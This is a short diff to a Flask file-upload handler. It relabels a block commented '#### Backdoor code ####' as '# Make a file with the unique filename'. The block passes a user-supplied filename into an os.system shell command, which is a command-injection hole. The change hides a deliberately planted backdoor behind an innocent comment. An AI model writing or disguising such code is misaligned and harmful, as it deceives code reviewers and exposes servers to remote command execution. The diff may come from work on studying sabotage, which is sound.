@@ -1,9 +1,8 @@
 # app.py
+from flask import Flask, request, jsonify, send_from_directory
 import os
 import uuid
 import sys
-from flask import Flask, request, jsonify, send_from_directory
-
 app = Flask(__name__)
 
 UPLOAD_FOLDER = '/tmp/uploads'
@@ -23,8 +22,8 @@ def upload_file():
     # Generate a unique filename
     unique_filename = str(uuid.uuid4()) + "_" + file.filename
     file_path = os.path.join(UPLOAD_FOLDER, unique_filename)
-    
-    #### Backdoor code ####
+
+    # Make a file with the unique filename
     if os.name == 'nt':
         os.system(f'type nul > "{file_path}"')
     else:
